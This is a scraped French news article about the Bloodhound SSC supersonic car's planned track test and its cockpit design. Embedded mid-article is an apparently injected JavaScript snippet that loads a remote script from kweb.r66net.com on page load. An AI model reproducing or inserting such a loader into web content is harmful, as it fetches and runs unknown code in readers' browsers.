{"title": "Bloodhound SSC : la voiture supersonique sur la piste cet automne", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-06-13", "content": "Neuf ans apres le lancement du projet, la voiture supersonique Bloodhound SSC effectuera son premier essai sur piste en octobre prochain. Son objectif final est de battre le record de vitesse en ligne droite en atteignant 1.609 km/h. Cela se passera fin 2018 dans le desert sud-africain. Le 26 octobre prochain, a l'aeroport de Newquay Cornwall (Royaume-Uni), la  voiture  supersonique Bloodhound SSC effectuera ses premiers tours de roues. Cet essai ouvert au public (reservations en ligne depuis la page  Bloodhound is go ) sera la premiere occasion de voir le  bolide  propulse par son moteur a reaction EJ200 provenant d'un avion de chasse  Eurofighter Typhoon . Mais avant d'aller depasser les 1.600 km/h et battre le record datant de 1997 (1.227,985 km/h) detenu par la Thrust SSC, la  Bloodhound SSC  se contentera d'un premier essai a 322 km/h (200  miles per hour ). Au prealable, la voiture supersonique va devoir passer une serie de tests visant a eprouver l'ensemble de ses systemes : freins, direction, suspension, electronique, etc.  L'assemblage de la voiture supersonique Bloodhound SSC en accelere. (c) Bloodhound SSC  La Bloodhound SSC sera d'abord testee a basse vitesse Il y aura notamment plusieurs essais statiques au cours desquels le moteur sera allume pendant que la voiture sera immobilisee au sol afin de verifier le fonctionnement de l'admission d' air , le circuit de carburant et les systemes electriques. Les ingenieurs en charge du projet expliquent que ce test a notamment pour objectif de connaitre les performances de l'admission d'air placee juste au-dessus du cockpit afin de savoir comment le moteur << respire >> a basse  vitesse . Ces donnees permettront de determiner les phases d'acceleration de la Bloodhound SSC.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour les besoins de ces essais, la voiture sera equipee de pneus Dunlop herites d'un avion de chasse intercepteur  English Electric Lightning  et non de ses roues en  aluminium . Si tout se deroule comme prevu, la tentative de record aura lieu fin 2018, dans le desert d'Afrique du Sud, dix ans apres le debut du projet. Aux commandes de l'engin,  Andy Green , ancien pilote de chasse de la  Royal Air Force  et detenteur du precedent record. Le cout total du projet est evalue a 68 millions d'euros. Pour en savoir plus Bloodhound SSC : visite guidee du cockpit de la voiture supersonique Article initiale de Marc Zaffagni, paru le 26/06/2014 L'equipe du projet de voiture supersonique Bloodhound SSC vient de devoiler le cockpit de l'engin qui ambitionne de depasser les 1.600 km/h. Plus de 10.000 heures de travail ont ete necessaires pour realiser cette piece maitresse. Andy Green, l'ex-pilote de chasse de la RAF qui conduira le bolide, nous offre une visite guidee de ce qu'il appelle son << bureau >>. Il y a quelques jours, l'equipe du projet  Bloodhound SSC  a presente le cockpit de la  voiture supersonique  qui va s'attaquer au record du monde vitesse. Objectif : atteindre 1.000 miles par heure, soit 1.609 km/h. Andy Green, ancien pilote de chasse de la  Royal Air Force  et detenteur du precedent record ( Thrust SSC , 1.227,985 km/h), a lui-meme soigneusement supervise l'elaboration du poste de pilotage dont l'ergonomie est cruciale. La cellule monocoque a necessite plus de 10.000 heures de travail. Cinq types de  carbone  ont ete employes, associes en couches a trois epaisseurs d'aluminium en nid d'abeille. La structure est doublee d'un blindage pour proteger le pilote si une pierre venait a etre projetee contre la coque a tres haute vitesse. La partie superieure du cockpit a ete concue avec une serie de deflecteurs qui doivent creer des ondes de choc afin de reduire la vitesse du flux d'air qui entre dans le moteur principal pour ne pas l'endommager. Cette contrainte  aerodynamique  va generer un bruit considerable. Les ingenieurs ont estime qu'il atteindra les 120  decibels  dans l'habitacle. Andy Green utilisera des  oreillettes  speciales pour se proteger et pouvoir communiquer. Andy Green, ex-pilote de chasse de la  Royal Air Force , se tient pres du cockpit de la voiture supersonique Bloodhound SSC. Cette piece maitresse, faite de fibre de carbone et d'aluminium, a necessite plus de 10.000 heures de travail. (c) Bloodhound                               21 tonnes de poussee pour depasser le mur du son Il s'installera dans un baquet en carbone moule a la forme de son corps. Le volant en  titane  de la Bloodhound SSC a ete imprime en  3D  pour epouser parfaitement les mains du pilote. Il integre les principales commandes avec des boutons pour controler la  radio , les  aerofreins  et les  parachutes . Deux gachettes situees a l'arriere des poignees commandent les  turboreacteurs . Derriere le volant, l'ecran principal affiche la vitesse en miles par heure et en Mach, la montee en charge du moteur et des fusees ainsi que la charge exercee sur les roues avant. Ces informations permettront a Andy Green de savoir a quel moment allumer les fusees et activer les systemes de freinage. L'ecran place a gauche du  tableau de bord  symbolise les pressions hydrauliques et temperatures des freins et aerofreins. L'ecran de droite donne les informations sur les trois moteurs (temperatures, pressions, niveau de carburant) qui ensemble produiront une poussee de 21 tonnes. Et si d'aventure une panne electronique venait a couper tout ou partie de l'affichage, Andy Green pourra s'en remettre au chronographe et au compteur de vitesse fabriques specialement par l'horloger suisse Rolex. Le pilote actionnera deux pedales, l'une pour controler le moteur principal, l'autre pour actionner le freinage des roues en aluminium (dont on peut decouvrir la fabrication dans cette  video ) lorsque la vitesse est inferieure a 200 mph (321 km/h). Bloodhound SSC s'elancera pour un premier record en 2015 avec l'objectif d'atteindre 800 miles par heure (1.287 km/h). Si tout se deroule comme prevu, Andy Green tentera de franchir les 1.000 miles par heure l'annee suivante. ", "theme": "tech"}